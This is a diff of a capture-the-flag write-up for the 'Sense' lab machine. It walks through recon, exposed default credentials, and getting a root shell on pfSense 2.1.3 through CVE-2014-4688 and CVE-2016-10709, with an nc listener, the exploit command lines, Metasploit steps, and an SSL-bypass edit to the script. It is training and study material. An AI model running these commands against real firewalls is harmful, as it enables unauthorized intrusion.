@@ -28,12 +28,14 @@ I performed a intense nmap scan on the machine, and the command used was the fol
 
 **Output:**
 ![nmap output](images-sense/1.png)
+
 As we can see that the nmap output is not too much. The only ports or services which are open are 80/http and 443/https. I felt shocked, because most of the time there are atleast 4 services running, but with this machine we only have 2 service which are so obvious ones. Anyways, without thinking much I started looking for vulnerabilities, so I started looking at *lighttpd 1.4.35*, but I was unable to find anything interesting. 
 
 ### 2. Web Recon
 After finding nothing interesting, I immediately opened the web server that was running on the machine. I opened the webserver and went to "View Source", but had no luck in finding any sweet or suspicious comment. I decided to have a look at the webserver's interface, so I started playing with the login page that we were provided.
 
 ![webserver](images-sense/2.png)
+
 As seen clearly, this is a **pfSense Firewall** login page, no doubt why this machine's name is Sense. After trying cross-site scripting (XSS), SQL injection, and trying default credentials I thought to brute-force it, and failing terribly in those two things I realised maybe I am missing something. I didn't wanted to waste my time in continuous thinking, so I performed a well-known technique of active recon, subdir search.
 
 I used the following command to perform subdir scan:
@@ -47,14 +49,17 @@ I used the following command to perform subdir scan:
 - `-x` - Specifies which extension to look for, here I am looking for .txt files. It is because text files are generally in plaintext and they might give us sensitive information
 
 ![Subdir search](images-sense/3.png)
+
 Intensively scanning through subdomains, we found two interesting text files that are accessible to public. What are these text files? 
 - changelog - These are special files that are used to keep a track of changes made to the domain, such as recent updates, patches, or development changes. It should not be publicly accessible, or else it can leak sensitive plans.
 - system-users - The name is enough to suggest the purpose of the file. It stores data related to the users, such as any new user settings, or configuration of a new user.
 
 ![changelog](images-sense/4.png)
+
 Analysing the changelog.txt sub-file, we find a very crucial statement, which is *"2 of 3 vulnerabilities have been patched"*, it means that 1 known vulnerability still remain unfixed, but we do not have any version information about pfSense, hence we cannot determine the vulnerability right now. I started looking at another file
 
 ![system-users](images-sense/5.png)
+
 Woah! that is a big reveal. We found credentials in system-user file. Following are the credentials mentioned here:
 ```
 username = rohit
@@ -64,6 +69,7 @@ password = pfsense (default)
 I tried login into the pfsense using the credentials that we just found, and I was able to successfully access the pfSense firewall web-dashboard. I started looking within all tabs, but I found nothing interesting except a proper version for the pfSense that was being used.
 
 ![pfSense logged in](images-sense/6.png)
+
 I have marked the version section with a red box, and we can clearly see that it is a **pfSense 2.1.3-Release** version that works on **FreeBSD 8.3-Release-p16**. Looking at the version, I was getting a feeling that it is vulnerable, and also we were previous told that 2 vulnerabilities were fixed out of 3, so definitely this is our entry point. I started searching and googling for available vulnerabilities and exploits.
 
 ## Gaining Access: the end
@@ -72,25 +78,37 @@ Initially, I started googling "pfSense Vulnerabilities" without specifying the v
 `searchsploit pfSense`
 
 ![searchsploit output](images-sense/7.png)
+
+**Links:**
+1. [exploitdb - CVE-2014-4688](https://www.exploit-db.com/exploits/43560)
+2. [CVE-2014-4688](https://nvd.nist.gov/vuln/detail/CVE-2014-4688)
+
 I have marked the exploit that I thought will definitely work, why? Firstly, it exactly fits our version (2.1.3) and secondly, it is a python script which is easy to edit so we can make a unique exploit if needed. I immediately imported this exploit using the following command and checked for correct options in the program, then exploited it.
 
 Command to download the exploit:
 `searchsploit -m php/webapps/43560.py`
 
 Command for exploitation (with a listener):
-`nc -lnvp 4444`
-`./43560.py --rhost 10.10.10.60 --lhost 10.10.14.11 --lport 4444 --username rohit --password pfsense`
+- `nc -lnvp 4444`
+- `./43560.py --rhost 10.10.10.60 --lhost 10.10.14.11 --lport 4444 --username rohit --password pfsense`
 
 ![python exploit failed](images-sense/8.png)
 ![no SSL cert](images-sense/9.png)
+
 From the above image it is clear that I opened a listener on port 4444 for all incoming traffic to any of my IP address, and on second terminal I ran the exploit and it failed! Why? simplest explaination is that the SSL certificate of the target is expired very long ago, so the exploit cannot bypass the request for a valid SSL certificate, and due to that it will not work. 
 
 I was already exhausted from searching the correct exploit, because there were many but to determine which CVE or vulnerability will work for this specific machine was kind of tricky. So, I started reading the descriptions and requirements for the exploit to get an idea whether it will get us in or not, and this point is very important. You must have enough information about the target to determine or build a perfect exploit for it. I looked multiple CVEs, but there was one CVE which was giving the vibe of a perfect exploit.
 
 ![CVE-2016-10709](images-sense/10.png)
+
+**Links:**
+1. [CVE-2016-10709](https://nvd.nist.gov/vuln/detail/CVE-2016-10709)
+2. [metasploit exploit](https://www.rapid7.com/db/modules/exploit/unix/http/pfsense_graph_injection_exec/)
+
 As seen clearly in the image, it is the exploit that works for pfSense before 2.3. This was the point that was putting me under doubt, because the version is definitely in our favour, but with a huge difference. Our version is 2.1.3 and this exploit covers all versions before 2.3, so there can be chances that it might fail. Fortunately, we are hackers, we eventually try everything.
 
 ![metasploit-exploit](images-sense/11.png)
+
 After reviewing the CVE a little more on google search engine, I found a metasploit exploit associated with the CVE and this hyped my confidence. So, I immediately opened metasploit and started figuring out what options will perfectly work for me. The commands I used were as follow:
 
 ```
@@ -106,6 +124,7 @@ exploit
 
 ![metasploit-setup1](images-sense/12.png)
 ![metasploit-setup2](images-sense/13.png)
+
 *Woah! Time for celebration.* We were finally able to achieve root access, but I would have felt little more adrenaline if there was privilege escalation. Anyways, staying happy with what we achieved, I explored for the final part, **THE FLAGS**. For this machine, we have two flags, one for the user and another for the root. Before that, let me explain the setup for metasploit that I used:
 
 **Metasploit options:**
@@ -117,6 +136,7 @@ exploit
 
 ##### The Flags:
 ![flags](images-sense/flags.png)
+
 I have hidden the flags because I want people go and try themselves and do not just copy paste the flags. I also have described every detail about vulnerabilities identified, how to mitigate them and what should we learn from this under the conclusion section.
 
 ## Conclusion
@@ -167,10 +187,12 @@ Initially, I thought maybe the command injection is sanitized because they did m
 
 ![editing the exploit](images-sense/14.png)
 ![editing the exploit](images-sense/15.png)
+
 In the following image, I edit two statements that were requesting to the login page and getting the response. I added the following argument `verify=False` in the end of both the statement, so it will skip the SSL certificate verification, and if there are no other security measures then we will get a shell, because we are sending a specially-crafted payload that has a value of **/bin/sh**.
 
 ![got access](images-sense/16.png)
 ![got access](images-sense/17.png)
+
 Yey! We were able to exploit the system using this exploit also. I know this is out-of-syllabus because we already have managed to get root access, but hacking is all about exploring. My advice is, don't just hack a system. If something works, see why it works and if something does not work, see why it does not work. 
 
 ### Arbitrary Code Execution
